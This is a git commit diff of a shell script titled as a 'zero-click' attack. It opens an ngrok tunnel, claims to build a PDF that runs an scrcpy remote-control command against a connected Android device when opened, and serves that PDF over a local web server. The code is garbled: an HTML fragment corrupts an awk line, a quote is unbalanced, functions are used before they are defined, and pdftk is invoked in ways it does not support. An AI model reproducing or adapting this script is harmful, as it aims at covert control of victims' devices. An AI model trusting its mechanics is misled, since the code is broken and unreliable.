050195814bf52ddc4ee541f22d142833169f8619
SHIELD660 <richmondrichmond183@gmail.com>
2023-09-19 09:39:30 +0100

    Update FCP-Zeroclick-Update.sh

--- FCP-Zeroclick-Update.sh
+++ FCP-Zeroclick-Update.sh
@@ -4,16 +4,16 @@
 ngrok tcp 8080
 
 # Get the ngrok tunnel URL
-tunnel_url=$(ngrok status | grep "Forwarding" | awk '{print $6}')
+tunnel_url=$(ngrok status | grep "Forwarding" | awk '{print <span class="math-inline">6}')
 
 # Generate a PDF payload that will execute a command when opened
-pdf_payload=$(scrcpy --background --auto-connect yes")
+pdf_payload=$(generate_pdf_payload)
 
 # Create a text file that contains the scrcpy command
 command_file="/tmp/command.txt"
 
 # Write the scrcpy command to the text file
-echo "scrcpy --background --auto-connect yes" > $command_file
+echo "scrcpy -d $(get_device_id) --background --auto-connect yes" > $command_file
 
 # Convert the text file to a PDF file
 pdftk $command_file output $pdf_payload
@@ -23,3 +23,23 @@ xdg-open $pdf_payload &
 
 # Print the ngrok tunnel URL
 echo "Your ngrok tunnel is $tunnel_url"
+
+# Get the device ID of the first Android device that is connected to the computer
+function get_device_id() {
+  adb devices | grep device | head -n 1 | awk '{print $1}'
+}
+
+# Generate a PDF payload that will execute a command when opened
+function generate_pdf_payload() {
+  # Generate PDF payload using pdftk
+  pdftk "" output "$pdf_payload"
+
+  # Add the scrcpy command to the PDF payload
+  pdftk "$pdf_payload" insert "scrcpy -d $(get_device_id) --background --auto-connect yes" output "$pdf_payload"
+}
+
+# Start PDF web server
+function start_pdf_web_server() {
+  # Start a web server on port $PORT that serves the PDF file at $PAYLOAD_PATH
+  python -m http.server "$PORT" --directory "$PAYLOAD_PATH"
+}
